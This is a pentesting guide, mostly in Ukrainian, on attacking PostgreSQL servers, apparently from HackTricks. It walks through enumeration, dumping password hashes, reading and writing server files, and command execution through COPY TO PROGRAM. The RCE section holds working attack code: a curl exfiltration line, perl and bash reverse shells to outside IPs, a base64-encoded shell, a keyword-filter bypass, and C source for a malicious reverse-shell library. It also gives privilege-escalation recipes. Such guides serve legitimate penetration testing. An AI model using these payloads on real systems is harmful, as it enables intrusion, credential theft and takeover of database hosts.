# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Основна інформація**

**PostgreSQL** описується як **об'єктно-реляційна система управління базами даних**, яка є **з відкритим кодом**. Ця система не лише використовує мову SQL, але й розширює її додатковими можливостями. Її функціональні можливості дозволяють працювати з широким спектром типів даних та операцій, роблячи її універсальним вибором для розробників і організацій.

**Порт за замовчуванням:** 5432, і якщо цей порт вже використовується, здається, що postgresql використає наступний порт (ймовірно 5433), який не використовується.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Підключення & Basic Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Якщо при виконанні **`\list`** ви знайдете базу даних з назвою **`rdsadmin`**, ви знаходитесь в **AWS postgresql database**.

For more information about **how to abuse a PostgreSQL database** check:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Автоматичне перерахування
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Згідно з [**this research**](https://www.exploit-db.com/papers/13084), коли спроба з'єднання зазнає невдачі, `dblink` викидає виняток `sqlclient_unable_to_establish_sqlconnection`, що містить пояснення помилки. Нижче наведено приклади таких деталей.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Хост недоступний

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Порт закритий
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port відкритий
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
або
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Порт відкритий або фільтрований
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
У функціях PL/pgSQL наразі неможливо отримати деталі винятків. Проте, якщо у вас є прямий доступ до сервера PostgreSQL, ви можете витягти необхідну інформацію. Якщо витяг імен користувачів та паролів із системних таблиць неможливий, можна розглянути використання wordlist attack, описаного в попередньому розділі, оскільки це може дати позитивний результат.

## Enumeration of Privileges

### Roles

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Роль має привілеї суперкористувача                                                                                                                   |
| rolinherit     | Роль автоматично успадковує привілеї ролей, яких вона є членом                                                                                       |
| rolcreaterole  | Роль може створювати інші ролі                                                                                                                       |
| rolcreatedb    | Роль може створювати бази даних                                                                                                                      |
| rolcanlogin    | Роль може виконувати вхід. Тобто цю роль можна вказати як початковий ідентифікатор авторизації сесії                                                   |
| rolreplication | Роль є роллю реплікації. Роль реплікації може ініціювати з’єднання реплікації та створювати й видаляти replication slots.                             |
| rolconnlimit   | Для ролей, що можуть входити — встановлює максимальну кількість одночасних з’єднань, які може створювати ця роль. -1 означає без обмежень.             |
| rolpassword    | Не є паролем (завжди відображається як `********`)                                                                                                   |
| rolvaliduntil  | Час закінчення дії пароля (використовується лише для автентифікації паролем); null якщо без терміну дії                                              |
| rolbypassrls   | Роль обходить усі політики row-level security, див. [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) для більш детальної інформації. |
| rolconfig      | Значення за замовчуванням для конкретної ролі для змінних конфігурації під час виконання                                                             |
| oid            | Ідентифікатор ролі                                                                                                                                    |

#### Interesting Groups

- If you are a member of **`pg_execute_server_program`** you can **execute** programs
- If you are a member of **`pg_read_server_files`** you can **read** files
- If you are a member of **`pg_write_server_files`** you can **write** files

> [!TIP]
> Зверніть увагу, що в Postgres **user**, **group** і **role** — це **те саме**. Все залежить від **того, як ви їх використовуєте** та чи ви **дозволяєте їм входити**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Таблиці
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Функції
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Дії з файловою системою

### Читання директорій та файлів

З цього [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) члени визначеної групи **`DEFAULT_ROLE_READ_SERVER_FILES`** (названої **`pg_read_server_files`**) та **super users** можуть використовувати метод **`COPY`** на будь-якому шляху (див. `convert_and_check_filename` у `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Пам'ятайте, що якщо ви не є суперкористувачем, але маєте права **CREATEROLE**, ви можете **зробити себе членом цієї групи:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Існують також **інші функції postgres**, які можна використати для **читання файлу або переліку директорії**. Тільки **суперкористувачі** та **користувачі з явними дозволами** можуть ними користуватися:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Ви можете знайти **більше функцій** в [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Просте записування файлів

Лише **super users** та члени **`pg_write_server_files`** можуть використовувати copy для запису файлів.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Пам'ятайте, що якщо ви не є super user, але маєте права **`CREATEROLE`**, ви можете **зробити себе членом цієї групи:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Пам'ятайте, що COPY не може обробляти newline chars, тому навіть якщо ви використовуєте base64 payload ви повинні **надіслати one-liner**.\
Дуже важливим обмеженням цієї техніки є те, що **`copy` не може бути використаний для запису бінарних файлів, оскільки він змінює деякі бінарні значення.**

### **Завантаження бінарних файлів**

Однак існують **інші методи для завантаження великих бінарних файлів:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Оновлення даних таблиці PostgreSQL через запис у локальний файл

Якщо у вас є необхідні права на читання та запис файлів сервера PostgreSQL, ви можете оновити будь-яку таблицю на сервері, **перезаписавши пов'язаний filenode** у [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Необхідні кроки:

1.  Отримати каталог даних PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Примітка:** Якщо ви не можете отримати поточний шлях до каталогу даних з налаштувань, ви можете дізнатися основну версію PostgreSQL через запит `SELECT version()` і спробувати brute-force шлях. Типові шляхи каталогу даних на Unix інсталяціях PostgreSQL — `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Звичайна назва кластера — `main`.

2.  Отримати відносний шлях до filenode, пов'язаного з цільовою таблицею

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Цей запит повинен повернути щось на кшталт `base/3/1337`. Повний шлях на диску буде `$DATA_DIRECTORY/base/3/1337`, тобто `/var/lib/postgresql/13/main/base/3/1337`.

3.  Завантажити filenode за допомогою функцій `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Отримати тип даних, пов'язаний з цільовою таблицею

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Використайте [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); встановіть всі булеві прапорці `rol*` в 1 для повних прав.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Заново завантажте відредагований filenode за допомогою функцій `lo_*`, і перезапишіть оригінальний файл на диску

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Опційно)_ Очистіть кеш таблиці в пам'яті, виконавши ресурсоємний SQL-запит

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Тепер ви повинні побачити оновлені значення таблиці в PostgreSQL.

Ви також можете стати суперадміном, редагуючи таблицю `pg_authid`. **Дивіться** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE в програму**

Починаючи з[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), тільки **super users** та учасники групи **`pg_execute_server_program`** можуть використовувати copy для RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Приклад для exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Пам'ятайте, що якщо ви не є суперкористувачем, але маєте права **`CREATEROLE`**, ви можете **зробити себе членом цієї групи:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Or use the `multi/postgres/postgres_copy_from_program_cmd_exec` module from **metasploit**.\
More information about this vulnerability [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). While reported as CVE-2019-9193, Postges declared this was a [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Bypass keyword filters/WAF to reach COPY PROGRAM

У контекстах SQLi зі складеними запитами WAF може видаляти або блокувати буквальне ключове слово `COPY`. Ви можете динамічно побудувати оператор і виконати його всередині PL/pgSQL DO блока. Наприклад, побудуйте першу літеру C за допомогою `CHR(67)`, щоб обійти наївні фільтри, і EXECUTE зібраний запит:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Once you have **learned** from the previous post **how to upload binary files** you could try obtain **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> The following RCE vectors are especially useful in constrained SQLi contexts, as all steps can be performed through nested SELECT statements

**Наступні вектори RCE** особливо корисні в обмежених контекстах SQLi, оскільки всі кроки можна виконати через вкладені SELECT statements

The **configuration file** of PostgreSQL is **writable** by the **postgres user**, which is the one running the database, so as **superuser**, you can write files in the filesystem, and therefore you can **overwrite this file.**

**Файл конфігурації** PostgreSQL **доступний для запису** користувачем **postgres**, який запускає базу даних, тож як **superuser** ви можете записувати файли в файлову систему і, відповідно, **перезаписати цей файл.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

Більше інформації [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

The configuration file have some interesting attributes that can lead to RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Path to the private key of the database
  - Шлях до приватного ключа бази даних
- `ssl_passphrase_command = ''` If the private file is protected by password (encrypted) postgresql will **execute the command indicated in this attribute**.
  - Якщо приватний файл захищено паролем (зашифровано), postgresql **виконає команду, вказану в цьому атрибуті**.
- `ssl_passphrase_command_supports_reload = off` **If** this attribute is **on** the **command** executed if the key is protected by password **will be executed** when `pg_reload_conf()` is **executed**.
  - **Якщо** цей атрибут встановлено **on**, то **команда**, яка використовується для розшифровки ключа, **буде виконана** при виклику `pg_reload_conf()`.

Then, an attacker will need to:

1. **Dump private key** from the server
2. **Encrypt** downloaded private key:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Overwrite**
4. **Dump** the current postgresql **configuration**
5. **Overwrite** the **configuration** with the mentioned attributes configuration:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Execute `pg_reload_conf()`

Під час тестування я помітив, що це працюватиме тільки якщо **файл приватного ключа має права 640**, він **належить root** та групі **ssl-cert або postgres** (щоб користувач postgres міг його читати), і розташований у _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Another attribute in the configuration file that is exploitable is `archive_command`.

For this to work, the `archive_mode` setting has to be `'on'` or `'always'`. If that is true, then we could overwrite the command in `archive_command` and force it to execute via the WAL (write-ahead logging) operations.

Загальні кроки:

1. Check whether archive mode is enabled: `SELECT current_setting('archive_mode')`
2. Overwrite `archive_command` with the payload. For eg, a reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Reload the config: `SELECT pg_reload_conf()`
4. Force the WAL operation to run, which will call the archive command: `SELECT pg_switch_wal()` or `SELECT pg_switch_xlog()` for some Postgres versions

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

When multi-line writes are needed (e.g., to set multiple GUCs), use PostgreSQL Large Objects to read and overwrite the config entirely from SQL. This approach is ideal in SQLi contexts where `COPY` cannot handle newlines or binary-safe writes.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
This yields reliable OS command execution via `archive_command` as the `postgres` user, provided `archive_mode` is enabled. In practice, setting a low `archive_timeout` can cause rapid invocation without requiring an explicit WAL switch.

#### **RCE with preload libraries**

Більше інформації [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

Цей вектор атаки використовує наступні змінні конфігурації:

- `session_preload_libraries` -- бібліотеки, які завантажуватимуться сервером PostgreSQL при підключенні клієнта.
- `dynamic_library_path` -- перелік каталогів, де сервер PostgreSQL буде шукати бібліотеки.

Можна встановити значення `dynamic_library_path` на каталог, записуваний користувачем `postgres`, що запускає базу даних, наприклад `/tmp/`, і завантажити туди шкідливий `.so` об'єкт. Далі ми змусимо сервер PostgreSQL завантажити нашу нову бібліотеку, включивши її у змінну `session_preload_libraries`.

Кроки атаки:

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Upload the malicious `postgresql.conf`, created in steps 2-3, and overwrite the original one
7. Upload the `payload.so` from step 5 to the `/tmp` directory
8. Reload the server configuration by restarting the server or invoking the `SELECT pg_reload_conf()` query
9. At the next DB connection, you will receive the reverse shell connection.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Згідно з [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Ролі, які мають привілей **`CREATEROLE`**, можуть **надавати або відкликати членство в будь-якій ролі**, яка **не є** **superuser**._

Отже, якщо у вас є дозвіл **`CREATEROLE`**, ви можете надати собі доступ до інших **ролей** (які не є superuser), які можуть дозволити читати та записувати файли та виконувати команди:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Змінити пароль

Користувачі з цією роллю також можуть **змінювати** **паролі** інших **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Дуже часто трапляється, що **локальні користувачі можуть підключатися до PostgreSQL без надання пароля**. Тому, коли ви отримали **дозволи на виконання коду**, ви можете зловживати цими дозволами, щоб отримати роль **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Це зазвичай можливо через такі рядки у файлі **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

В [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) пояснюється, як було можливе **privesc** в Postgres GCP, зловживаючи привілеєм ALTER TABLE, який був наданий користувачу.

Коли ви намагаєтеся **призначити іншого користувача власником таблиці**, ви повинні отримати **помилку**, яка це забороняє, але, схоже, GCP дав цю **опцію не-суперкористувачу postgres** у GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Поєднуючи цю ідею з тим фактом, що коли команди **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) виконуються над **таблицею з функцією індекса**, **функція** викликається як частина команди з правами **власника таблиці**. Можна створити індекс із функцією і надати права власника на цю таблицю **super user**, а потім запустити ANALYZE над таблицею зі шкідливою функцією, яка зможе виконувати команди, оскільки використовує привілеї власника.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Почніть зі створення нової таблиці.
2. Вставте деякий нерелевантний вміст у таблицю, щоб надати дані для функції індексу.
3. Розробіть шкідливу функцію індексу, яка містить code execution payload, що дозволяє виконувати неавторизовані команди.
4. ALTER the table's owner to "cloudsqladmin," який є суперкористувачем GCP, що використовується виключно Cloud SQL для управління та обслуговування бази даних.
5. Виконайте операцію ANALYZE на таблиці. Ця дія примушує движок PostgreSQL переключитися в контекст користувача власника таблиці — "cloudsqladmin." Внаслідок цього шкідлива функція індексу викликається з правами "cloudsqladmin," що дозволяє виконати раніше неавторизовану shell command.

In PostgreSQL, this flow looks something like this:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Тоді таблиця `shell_commands_results` міститиме вивід виконаного коду:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Локальний вхід

Деякі неправильно налаштовані екземпляри postgresql можуть дозволяти вхід будь-якого локального користувача. Можна підключитися локально з 127.0.0.1, використовуючи **`dblink` функцію**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Зауважте, що для роботи попереднього запиту **функція `dblink` має існувати**. Якщо її немає, ви можете спробувати створити її за допомогою
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> Якщо у вас є пароль користувача з більшими привілеями, але цьому користувачу заборонено входити з зовнішньої IP-адреси, ви можете використати наступну функцію, щоб виконувати запити від імені цього користувача:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Можна перевірити, чи існує ця функція за допомогою:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Користувацька визначена функція з** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters were able to privesc inside a postgres instance provided by IBM, because they **знайшли цю функцію з прапором SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) a function with **SECURITY DEFINER is executed** with the privileges of the **user that owns it**. Therefore, if the function is **vulnerable to SQL Injection** or is doing some **privileged actions with params controlled by the attacker**, it could be abused to **escalate privileges inside postgres**.

У рядку 4 попереднього коду ви можете побачити, що функція має прапор **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
А потім **виконайте команди**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Брутфорс паролів за допомогою PL/pgSQL

**PL/pgSQL** — це **повнофункціональна мова програмування**, яка дає більший процедурний контроль у порівнянні з SQL. Вона дозволяє використовувати **цикли** та інші **конструкції керування**, щоб покращити логіку програми. Крім того, **SQL-вислови** та **тригери** можуть викликати функції, створені з використанням мови **PL/pgSQL**. Це поєднання дає більш всебічний і гнучкий підхід до програмування та автоматизації бази даних.\
**Ви можете зловживати цією мовою, щоб змусити PostgreSQL виконувати brute-force облікових даних користувачів.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> Наступний вектор privesc особливо корисний у обмежених контекстах SQLi, оскільки всі кроки можна виконати через вкладені SELECT-вислови

Якщо ви можете **читати та записувати файли сервера PostgreSQL**, ви можете **стати суперкористувачем**, перезаписавши on-disk filenode PostgreSQL, пов'язаний з внутрішньою таблицею `pg_authid`.

Детальніше про **цю техніку** можна прочитати [**тут**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Кроки атаки:

1. Отримати каталог даних PostgreSQL
2. Отримати відносний шлях до filenode, пов’язаного з таблицею `pg_authid`
3. Завантажити filenode за допомогою функцій `lo_*`
4. Отримати тип даних, пов’язаний з таблицею `pg_authid`
5. Використати [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor), щоб [відредагувати filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); встановити всі булеві прапори `rol*` у 1 для повних прав.
